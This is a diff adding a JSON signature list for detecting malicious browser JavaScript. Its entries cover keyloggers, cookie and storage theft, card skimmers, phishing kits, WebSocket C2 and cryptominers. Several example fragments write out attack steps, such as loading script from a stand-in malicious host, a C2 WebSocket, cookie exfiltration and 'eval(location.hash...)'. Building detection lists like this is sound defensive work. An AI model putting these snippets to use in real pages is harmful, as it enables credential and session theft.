@@ -1,0 +1,1099 @@
+﻿[
+    {
+        "id": 1,
+        "type": "js_obfuscation",
+        "category": "dropper",
+        "patterns": [
+            "eval(",
+            "atob(",
+            "String.fromCharCode(",
+            "Function("
+        ],
+        "description": "Base64 or hex-packed dropper script",
+        "example": "eval(atob('ZXZpbA...'))"
+    },
+    {
+        "id": 2,
+        "type": "js_obfuscation",
+        "category": "packer",
+        "patterns": [
+            "while(true)",
+            "_0x",
+            "constructor",
+            "toString().slice"
+        ],
+        "description": "Packer-based obfuscation using infinite loops and XOR tables",
+        "example": "var _0x123abc=..."
+    },
+    {
+        "id": 3,
+        "type": "js_redirect",
+        "category": "phishing_redirect",
+        "patterns": [
+            "window.location",
+            "document.location",
+            "meta refresh",
+            "replace('http')"
+        ],
+        "description": "Redirect to phishing URL",
+        "example": "window.location='http://login-verify.com'"
+    },
+    {
+        "id": 4,
+        "type": "js_keylogger",
+        "category": "credential_theft",
+        "patterns": [
+            "document.addEventListener('keydown'",
+            "fetch(",
+            "sendBeacon"
+        ],
+        "description": "Browser keylogging script",
+        "example": "document.addEventListener('keydown',e=>{fetch('/log',...)"
+    },
+    {
+        "id": 5,
+        "type": "js_c2",
+        "category": "command_control",
+        "patterns": [
+            "new WebSocket",
+            "wss://",
+            "onmessage"
+        ],
+        "description": "Browser WebSocket C2 for malware",
+        "example": "ws=new WebSocket('wss://c2-malware.com')"
+    },
+    {
+        "id": 6,
+        "type": "js_stealer",
+        "category": "cookie_theft",
+        "patterns": [
+            "document.cookie",
+            "XMLHttpRequest",
+            "encodeURIComponent"
+        ],
+        "description": "Cookie exfiltration",
+        "example": "xhr.send(document.cookie)"
+    },
+    {
+        "id": 7,
+        "type": "js_formgrabber",
+        "category": "phishing",
+        "patterns": [
+            "form.submit()",
+            "auto-submit",
+            "hidden input"
+        ],
+        "description": "Phishing kit auto-form submission",
+        "example": "document.forms[0].submit()"
+    },
+    {
+        "id": 8,
+        "type": "js_overlay",
+        "category": "fake_ui",
+        "patterns": [
+            "position:fixed",
+            "z-index:999999",
+            "opacity"
+        ],
+        "description": "Overlay-based phishing attack",
+        "example": "<div style='position:fixed;top:0...'>"
+    },
+    {
+        "id": 9,
+        "type": "js_loader",
+        "category": "payload_loader",
+        "patterns": [
+            "fetch(",
+            "script.src",
+            "appendChild"
+        ],
+        "description": "Loads and executes remote JS malware",
+        "example": "script.src='http://malicious.js'"
+    },
+    {
+        "id": 10,
+        "type": "js_cryptominer",
+        "category": "mining",
+        "patterns": [
+            "WebAssembly",
+            "Crypto",
+            "miner",
+            "Uint8Array"
+        ],
+        "description": "Browser cryptomining malware",
+        "example": "new WebAssembly.Instance(...)"
+    },
+    {
+        "id": 11,
+        "type": "js_ransomware",
+        "category": "browser_ransom",
+        "patterns": [
+            "webkit",
+            "mozfullscreen",
+            "document.write",
+            "Your files are encrypted"
+        ],
+        "description": "Fake browser ransomware",
+        "example": "document.write('Pay to decrypt')"
+    },
+    {
+        "id": 12,
+        "type": "js_silent_redirect",
+        "category": "C2_redirect",
+        "patterns": [
+            "iframe.style.display='none'",
+            "src='http"
+        ],
+        "description": "Invisible iframe redirection",
+        "example": "<iframe style='display:none' src='http://...'/>"
+    },
+    {
+        "id": 13,
+        "type": "js_bot",
+        "category": "bot_client",
+        "patterns": [
+            "setInterval",
+            "ping",
+            "fetch(\"/status\")"
+        ],
+        "description": "Bot-style beaconing",
+        "example": "setInterval(()=>fetch('/ping'),5000)"
+    },
+    {
+        "id": 14,
+        "type": "js_dns_exfil",
+        "category": "data_exfiltration",
+        "patterns": [
+            "new Image(",
+            "img.src"
+        ],
+        "description": "Data exfiltration through DNS-like beacons",
+        "example": "img.src='http://domain.com/log?data='+x"
+    },
+    {
+        "id": 15,
+        "type": "js_xss_payload",
+        "category": "xss",
+        "patterns": [
+            "alert(",
+            "document.write",
+            "location.hash",
+            "eval"
+        ],
+        "description": "Malicious XSS payload",
+        "example": "eval(location.hash.slice(1))"
+    },
+    {
+        "id": 16,
+        "type": "js_clickjacking",
+        "category": "frame_attack",
+        "patterns": [
+            "frameborder",
+            "opacity:0",
+            "pointer-events:none"
+        ],
+        "description": "Clickjacking UI overlay",
+        "example": "<iframe style='opacity:0' ...>"
+    },
+    {
+        "id": 17,
+        "type": "js_malvertising",
+        "category": "ads_abuse",
+        "patterns": [
+            "adservice",
+            "doubleclick",
+            "popup",
+            "onclick="
+        ],
+        "description": "Malvertising redirector script",
+        "example": "window.open('http://scam-ad.com')"
+    },
+    {
+        "id": 18,
+        "type": "js_backdoor",
+        "category": "webshell_client",
+        "patterns": [
+            "XMLHttpRequest",
+            "/cmd",
+            "exec"
+        ],
+        "description": "JS backdoor for browser exploitation",
+        "example": "xhr.open('POST','/cmd')"
+    },
+    {
+        "id": 19,
+        "type": "phishing_brand",
+        "category": "microsoft",
+        "patterns": [
+            "login.live.com",
+            "microsoft",
+            "signin",
+            "redirect",
+            "base64 brand"
+        ],
+        "description": "Microsoft phishing kit JS",
+        "example": "decodeURIComponent('%3Clogin%3E')"
+    },
+    {
+        "id": 20,
+        "type": "phishing_brand",
+        "category": "google",
+        "patterns": [
+            "accounts.google.com",
+            "gstatic",
+            "oauth",
+            "password"
+        ],
+        "description": "Google login phishing script"
+    },
+    {
+        "id": 21,
+        "type": "phishing_brand",
+        "category": "facebook",
+        "patterns": [
+            "fbcdn",
+            "checkpoint",
+            "recovery",
+            "password"
+        ],
+        "description": "Facebook phishing kit JS"
+    },
+    {
+        "id": 22,
+        "type": "phishing_brand",
+        "category": "amazon",
+        "patterns": [
+            "amazon",
+            "order",
+            "verify",
+            "billing",
+            "otp"
+        ],
+        "description": "Amazon credential harvesting JS"
+    },
+    {
+        "id": 23,
+        "type": "js_magecart",
+        "category": "credit_card_skimming",
+        "patterns": [
+            "card",
+            "checkout",
+            "skimmer",
+            "fetch"
+        ],
+        "description": "Magecart credit card stealing JS",
+        "example": "fetch('/send?cc='+data)"
+    },
+    {
+        "id": 24,
+        "type": "js_formjack",
+        "category": "form_jacking",
+        "patterns": [
+            "onchange",
+            "input.value",
+            "send",
+            "credit"
+        ],
+        "description": "Formjacking malware script"
+    },
+    {
+        "id": 25,
+        "type": "js_webinject",
+        "category": "banking_trojan",
+        "patterns": [
+            "insertHTML",
+            "replace",
+            "innerHTML",
+            "fields"
+        ],
+        "description": "WebInject-style banking Trojan JS"
+    },
+    {
+        "id": 26,
+        "type": "js_obfuscation",
+        "category": "rot13",
+        "patterns": [
+            "replace(/[a-zA-Z]/g",
+            "charCodeAt",
+            "rot13"
+        ],
+        "description": "ROT13 JS obfuscation"
+    },
+    {
+        "id": 27,
+        "type": "js_obfuscation",
+        "category": "unicode_escape",
+        "patterns": [
+            "\\u00",
+            "unescape"
+        ],
+        "description": "Unicode-escaped malicious JS"
+    },
+    {
+        "id": 28,
+        "type": "js_obfuscation",
+        "category": "hex_encoded",
+        "patterns": [
+            "0x",
+            "parseInt",
+            "join"
+        ],
+        "description": "Hex-encoded malware payload"
+    },
+    {
+        "id": 29,
+        "type": "exploit",
+        "category": "browser_exploit",
+        "patterns": [
+            "ActiveXObject",
+            "Shell.Application",
+            "exploit"
+        ],
+        "description": "Old IE exploit JS"
+    },
+    {
+        "id": 30,
+        "type": "exploit",
+        "category": "pdf_exploit",
+        "patterns": [
+            "/OpenAction",
+            "/JS",
+            "this.exportDataObject"
+        ],
+        "description": "PDF embedded JS exploit"
+    },
+    {
+        "id": 31,
+        "type": "js_scam",
+        "category": "support_scam",
+        "patterns": [
+            "popup",
+            "call",
+            "tech support"
+        ],
+        "description": "Fake tech support browser scam JS"
+    },
+    {
+        "id": 32,
+        "type": "js_scam",
+        "category": "lottery",
+        "patterns": [
+            "congratulations",
+            "winner",
+            "claim prize"
+        ],
+        "description": "Lottery scam JS"
+    },
+    {
+        "id": 33,
+        "type": "js_iframe_chain",
+        "category": "redirect_chain",
+        "patterns": [
+            "iframe",
+            "chain",
+            "redirect",
+            "multi-hop"
+        ],
+        "description": "Multi-hop iframe redirect malware"
+    },
+    {
+        "id": 34,
+        "type": "js_hidden_form",
+        "category": "credential_harvest",
+        "patterns": [
+            "hidden",
+            "display:none",
+            "value="
+        ],
+        "description": "Hidden credential steal form"
+    },
+    {
+        "id": 35,
+        "type": "js_payload_drop",
+        "category": "malware_dropper",
+        "patterns": [
+            "blob",
+            "URL.createObjectURL",
+            "download"
+        ],
+        "description": "Browser-based payload drop"
+    },
+    {
+        "id": 36,
+        "type": "js_fingerprint",
+        "category": "tracking",
+        "patterns": [
+            "canvas.toDataURL",
+            "audioContext",
+            "devicePixelRatio"
+        ],
+        "description": "Browser fingerprinting by malware"
+    },
+    {
+        "id": 37,
+        "type": "js_rce_attempt",
+        "category": "remote_code_execution",
+        "patterns": [
+            "child_process",
+            "require",
+            "spawn"
+        ],
+        "description": "Node.js RCE attempt inside malicious JS"
+    },
+    {
+        "id": 38,
+        "type": "js_fake_update",
+        "category": "scareware",
+        "patterns": [
+            "update",
+            "flash",
+            "javascript required"
+        ],
+        "description": "Fake browser update JS malware"
+    },
+    {
+        "id": 39,
+        "type": "js_spam_bot",
+        "category": "bot_spam",
+        "patterns": [
+            "fetch('/sendSpam')",
+            "send email",
+            "auto-send"
+        ],
+        "description": "Spam bot JS"
+    },
+    {
+        "id": 40,
+        "type": "js_dynamic_import",
+        "category": "stealth_loader",
+        "patterns": [
+            "import(",
+            "blob:",
+            "data:"
+        ],
+        "description": "Stealth dynamic import loader"
+    },
+    {
+        "id": 41,
+        "type": "js_data_exfil",
+        "category": "exfil",
+        "patterns": [
+            "btoa",
+            "fetch",
+            "post"
+        ],
+        "description": "Base64 exfiltration through POST"
+    },
+    {
+        "id": 42,
+        "type": "js_csp_bypass",
+        "category": "security_bypass",
+        "patterns": [
+            "nonce",
+            "bypass",
+            "injected script"
+        ],
+        "description": "CSP bypass JS"
+    },
+    {
+        "id": 43,
+        "type": "js_click_fraud",
+        "category": "ad_fraud",
+        "patterns": [
+            "click",
+            "ad",
+            "iframe",
+            "auto-click"
+        ],
+        "description": "Browser click fraud bot JS"
+    },
+    {
+        "id": 44,
+        "type": "js_loader_polyglot",
+        "category": "polyglot",
+        "patterns": [
+            "/*",
+            "*/=1",
+            "//#"
+        ],
+        "description": "Polyglot JS loader malware"
+    },
+    {
+        "id": 45,
+        "type": "js_fake_captcha",
+        "category": "captcha_bypass",
+        "patterns": [
+            "captcha",
+            "verify",
+            "fake"
+        ],
+        "description": "Fake captcha to trick users"
+    },
+    {
+        "id": 46,
+        "type": "js_popup_loop",
+        "category": "browser_lockup",
+        "patterns": [
+            "while(true)",
+            "alert(",
+            "onbeforeunload"
+        ],
+        "description": "Infinite popup browser lock scam"
+    },
+    {
+        "id": 47,
+        "type": "js_hidden_script",
+        "category": "concealed_loader",
+        "patterns": [
+            "script.style.display",
+            "opacity:0",
+            "absolute"
+        ],
+        "description": "Hidden malicious script loader"
+    },
+    {
+        "id": 48,
+        "type": "js_inline_payload",
+        "category": "inline_malware",
+        "patterns": [
+            "<script>",
+            "eval(",
+            "decode"
+        ],
+        "description": "Inline malicious JS in HTML"
+    },
+    {
+        "id": 49,
+        "type": "js_obfuscated_vars",
+        "category": "variable_obfuscation",
+        "patterns": [
+            "var _0x",
+            "random string",
+            "mapping table"
+        ],
+        "description": "Variable renaming obfuscation"
+    },
+    {
+        "id": 50,
+        "type": "js_fake_wallet",
+        "category": "crypto_scam",
+        "patterns": [
+            "wallet",
+            "seed phrase",
+            "import",
+            "private key"
+        ],
+        "description": "Crypto wallet stealing JS"
+    },
+    {
+        "id": 501,
+        "type": "js_hidden_iframe_loader",
+        "category": "malware_loader",
+        "patterns": [
+            "iframe.style.visibility='hidden'",
+            "appendChild(iframe)"
+        ],
+        "description": "Hidden iframe used to load malicious content silently"
+    },
+    {
+        "id": 51,
+        "type": "js_obfuscated_payload",
+        "category": "encrypted_runtime_payload",
+        "patterns": [
+            "CryptoJS.AES.decrypt",
+            "CryptoJS.enc.Utf8",
+            "eval(",
+            "globalThis.eval"
+        ],
+        "description": "AES-encrypted malicious payload decrypted at runtime and executed with eval"
+    },
+    {
+        "id": 52,
+        "type": "js_dynamic_reconstruction",
+        "category": "string_obfuscation",
+        "patterns": [
+            "String.fromCharCode",
+            "array.join",
+            "numeric keyed arrays"
+        ],
+        "description": "Strings like 'globalThis' or 'eval' reconstructed from numeric arrays"
+    },
+    {
+        "id": 53,
+        "type": "ui_social_engineering",
+        "category": "fake_verification",
+        "patterns": [
+            "captcha",
+            "verify you are human",
+            "onclick"
+        ],
+        "description": "Fake CAPTCHA used to trigger malicious JS execution"
+    },
+    {
+        "id": 54,
+        "type": "js_multistage_payload",
+        "category": "layered_encryption",
+        "patterns": [
+            "var pk=",
+            "var xr=",
+            "var ya="
+        ],
+        "description": "Multiple encrypted blobs executed in staged sequence"
+    },
+    {
+        "id": 55,
+        "type": "js_eval_chain",
+        "category": "code_execution",
+        "patterns": [
+            "eval(eval(",
+            "Function(\"return\""
+        ],
+        "description": "Nested eval chains designed to unpack multiple layers of malicious code"
+    },
+    {
+        "id": 56,
+        "type": "js_heavy_obfuscation",
+        "category": "code_obfuscation",
+        "patterns": [
+            "while(true){} removed",
+            "dead code insertion"
+        ],
+        "description": "Artificial loops and dead code inserted to break de-obfuscators"
+    },
+    {
+        "id": 57,
+        "type": "js_shadow_DOM_attack",
+        "category": "dom_manipulation",
+        "patterns": [
+            "attachShadow",
+            "innerHTML"
+        ],
+        "description": "Using shadow DOM to hide malicious script injections"
+    },
+    {
+        "id": 58,
+        "type": "js_clickjacking",
+        "category": "ui_deception",
+        "patterns": [
+            "opacity:0",
+            "pointer-events:auto"
+        ],
+        "description": "Invisible clickable layer redirecting victims to malicious actions"
+    },
+    {
+        "id": 59,
+        "type": "js_cookie_exfil",
+        "category": "data_exfiltration",
+        "patterns": [
+            "document.cookie",
+            "fetch("
+        ],
+        "description": "Cookies captured and exfiltrated to remote server"
+    },
+    {
+        "id": 60,
+        "type": "js_credential_steal",
+        "category": "phishing",
+        "patterns": [
+            "input[type=password]",
+            "onchange",
+            "send"
+        ],
+        "description": "Keylogging or password-stealing script on fake login pages"
+    },
+    {
+        "id": 61,
+        "type": "js_base64_loader",
+        "category": "obfuscated_payload",
+        "patterns": [
+            "atob(",
+            "decodeURIComponent"
+        ],
+        "description": "Base64-decoded payload executed as JS"
+    },
+    {
+        "id": 62,
+        "type": "js_websocket_c2",
+        "category": "c2_communication",
+        "patterns": [
+            "new WebSocket",
+            "onmessage"
+        ],
+        "description": "Uses WebSocket channel for C2 communication"
+    },
+    {
+        "id": 63,
+        "type": "js_fake_update_page",
+        "category": "social_engineering",
+        "patterns": [
+            "Update Now",
+            "System Update",
+            "download"
+        ],
+        "description": "Malicious fake update screen pushing malware"
+    },
+    {
+        "id": 64,
+        "type": "js_hidden_form_autosubmit",
+        "category": "data_exfiltration",
+        "patterns": [
+            "form.submit()",
+            "display:none"
+        ],
+        "description": "Hidden forms auto-submitted to malicious server"
+    },
+    {
+        "id": 65,
+        "type": "js_crypto_miner",
+        "category": "cryptojacking",
+        "patterns": [
+            "WebAssembly",
+            "CryptoNight",
+            "miner"
+        ],
+        "description": "Web-based crypto miner running in browser"
+    },
+    {
+        "id": 66,
+        "type": "js_keystroke_logger",
+        "category": "keylogging",
+        "patterns": [
+            "document.addEventListener('keydown'"
+        ],
+        "description": "Browser-level keylogger sending captured keys to C2"
+    },
+    {
+        "id": 67,
+        "type": "js_dom_cloak",
+        "category": "visual_evasion",
+        "patterns": [
+            "visibility:hidden",
+            "setTimeout(show"
+        ],
+        "description": "Malicious DOM objects hidden until page loads"
+    },
+    {
+        "id": 68,
+        "type": "js_self_defense",
+        "category": "anti_analysis",
+        "patterns": [
+            "debugger",
+            "toString.toString"
+        ],
+        "description": "Malware detecting devtools or attempting to break debugger"
+    },
+    {
+        "id": 69,
+        "type": "js_iframe_autoredirect",
+        "category": "redirector",
+        "patterns": [
+            "location.replace",
+            "parent.location"
+        ],
+        "description": "Automatic redirect via iframe or parent window"
+    },
+    {
+        "id": 70,
+        "type": "js_xhr_c2",
+        "category": "c2_communication",
+        "patterns": [
+            "XMLHttpRequest",
+            "POST"
+        ],
+        "description": "XHR used for C2 commands or data exfiltration"
+    },
+    {
+        "id": 71,
+        "type": "js_canvas_fingerprint",
+        "category": "fingerprinting",
+        "patterns": [
+            "canvas.toDataURL",
+            "getImageData"
+        ],
+        "description": "Canvas fingerprinting for tracking or device profiling"
+    },
+    {
+        "id": 72,
+        "type": "js_webrtc_leak",
+        "category": "fingerprinting",
+        "patterns": [
+            "RTCPeerConnection",
+            "icecandidate"
+        ],
+        "description": "WebRTC used to leak local IP address"
+    },
+    {
+        "id": 73,
+        "type": "js_autodownload_malware",
+        "category": "driveby",
+        "patterns": [
+            "a.download",
+            "click()"
+        ],
+        "description": "Force-initiated malware file download"
+    },
+    {
+        "id": 74,
+        "type": "js_browser_exploit",
+        "category": "exploit_code",
+        "patterns": [
+            "ArrayBuffer overflow",
+            "use-after-free"
+        ],
+        "description": "Browser exploit shellcode or buffer overflow triggers"
+    },
+    {
+        "id": 75,
+        "type": "js_code_unpacker",
+        "category": "obfuscation",
+        "patterns": [
+            "split('')",
+            "reverse()"
+        ],
+        "description": "Payload strings reversed or scrambled then reconstructed"
+    },
+    {
+        "id": 76,
+        "type": "js_domain_generator",
+        "category": "dgA",
+        "patterns": [
+            "Math.random",
+            "charCodeAt"
+        ],
+        "description": "Generates random domains for C2 endpoints"
+    },
+    {
+        "id": 77,
+        "type": "js_malvertising",
+        "category": "ad_injection",
+        "patterns": [
+            "adframe",
+            "popunder"
+        ],
+        "description": "JS injecting malicious ads or popups"
+    },
+    {
+        "id": 78,
+        "type": "js_formjacking",
+        "category": "data_exfiltration",
+        "patterns": [
+            "querySelector('form')",
+            "cloneNode"
+        ],
+        "description": "Intercepting form submissions to steal data"
+    },
+    {
+        "id": 79,
+        "type": "js_ransomware_loader",
+        "category": "payload_loader",
+        "patterns": [
+            "crypto.subtle",
+            "encrypt"
+        ],
+        "description": "Browser-based ransomware or data locker loader"
+    },
+    {
+        "id": 80,
+        "type": "js_storage_exfil",
+        "category": "data_exfiltration",
+        "patterns": [
+            "localStorage",
+            "sessionStorage"
+        ],
+        "description": "Stealing localStorage or sessionStorage values"
+    },
+    {
+        "id": 81,
+        "type": "js_beacon_tracking",
+        "category": "tracking",
+        "patterns": [
+            "new Image().src"
+        ],
+        "description": "Pixel-beacon tracking and exfiltration"
+    },
+    {
+        "id": 82,
+        "type": "js_dynamic_import_payload",
+        "category": "payload_loader",
+        "patterns": [
+            "import(",
+            "blob:"
+        ],
+        "description": "Malware loaded using dynamic import() from Blob URL"
+    },
+    {
+        "id": 83,
+        "type": "js_fake_antivirus",
+        "category": "scareware",
+        "patterns": [
+            "Virus Detected",
+            "scan"
+        ],
+        "description": "Fake antivirus popup tricking user into installing malware"
+    },
+    {
+        "id": 84,
+        "type": "js_service_worker_malware",
+        "category": "persistent_injection",
+        "patterns": [
+            "navigator.serviceWorker.register"
+        ],
+        "description": "Malicious service worker persisting JS injection offline"
+    },
+    {
+        "id": 85,
+        "type": "js_html_template_injection",
+        "category": "injection",
+        "patterns": [
+            "innerHTML",
+            "template.innerHTML"
+        ],
+        "description": "Malware injected via HTML template reference"
+    },
+    {
+        "id": 86,
+        "type": "js_cookie_force_set",
+        "category": "session_attack",
+        "patterns": [
+            "document.cookie="
+        ],
+        "description": "Cookie manipulation for session takeover"
+    },
+    {
+        "id": 87,
+        "type": "js_referrer_spoof",
+        "category": "tracking_evasion",
+        "patterns": [
+            "referrerPolicy"
+        ],
+        "description": "Spoofing or clearing referrer to evade detection"
+    },
+    {
+        "id": 88,
+        "type": "js_history_manipulation",
+        "category": "ui_evasion",
+        "patterns": [
+            "history.pushState"
+        ],
+        "description": "Manipulates browser history to hide malicious redirects"
+    },
+    {
+        "id": 89,
+        "type": "js_popup_forcer",
+        "category": "user_interaction_bypass",
+        "patterns": [
+            "window.open",
+            "_blank"
+        ],
+        "description": "Forces pop-up windows to malicious landing pages"
+    },
+    {
+        "id": 90,
+        "type": "js_cloudflare_bypass",
+        "category": "anti_protection",
+        "patterns": [
+            "cf_challenge",
+            "solve"
+        ],
+        "description": "Script attempting to bypass Cloudflare protections"
+    },
+    {
+        "id": 91,
+        "type": "js_payload_from_css",
+        "category": "covert_payload",
+        "patterns": [
+            "url(data:",
+            "background-image"
+        ],
+        "description": "Malware hidden in CSS data URLs"
+    },
+    {
+        "id": 92,
+        "type": "js_payload_from_svg",
+        "category": "fileless_injection",
+        "patterns": [
+            "<svg",
+            "onload="
+        ],
+        "description": "SVG files embedding malicious JS"
+    },
+    {
+        "id": 93,
+        "type": "js_hidden_audio_fingerprint",
+        "category": "fingerprinting",
+        "patterns": [
+            "AudioContext",
+            "createOscillator"
+        ],
+        "description": "Browser audio fingerprinting technique"
+    },
+    {
+        "id": 94,
+        "type": "js_suspicious_timeout_loader",
+        "category": "delayed_execution",
+        "patterns": [
+            "setTimeout(function(){",
+            "5000"
+        ],
+        "description": "Delayed malicious payload execution"
+    },
+    {
+        "id": 95,
+        "type": "js_c2_over_image",
+        "category": "covert_channel",
+        "patterns": [
+            "new Image().src",
+            "encoded parameters"
+        ],
+        "description": "C2 commands hidden inside image requests"
+    },
+    {
+        "id": 96,
+        "type": "js_file_reader_exfil",
+        "category": "file_exfiltration",
+        "patterns": [
+            "FileReader",
+            "readAsText"
+        ],
+        "description": "Reads local files selected by user and exfiltrates contents"
+    },
+    {
+        "id": 97,
+        "type": "js_dom_rewrite_attack",
+        "category": "dom_attack",
+        "patterns": [
+            "document.write",
+            "override"
+        ],
+        "description": "Overwrites DOM to inject malicious HTML/JS"
+    },
+    {
+        "id": 98,
+        "type": "js_mousemove_trigger",
+        "category": "event_trigger",
+        "patterns": [
+            "mousemove",
+            "execute"
+        ],
+        "description": "Payload waits for mouse movement before executing"
+    },
+    {
+        "id": 99,
+        "type": "js_clipboard_hijack",
+        "category": "clipboard_attack",
+        "patterns": [
+            "navigator.clipboard.writeText"
+        ],
+        "description": "Hijacks clipboard text to replace with attacker-controlled content"
+    },
+    {
+        "id": 100,
+        "type": "js_payload_steganography",
+        "category": "steganography",
+        "patterns": [
+            "data:image/png;base64",
+            "extract hidden payload"
+        ],
+        "description": "Malicious JS payload extracted from encoded images"
+    }
+]
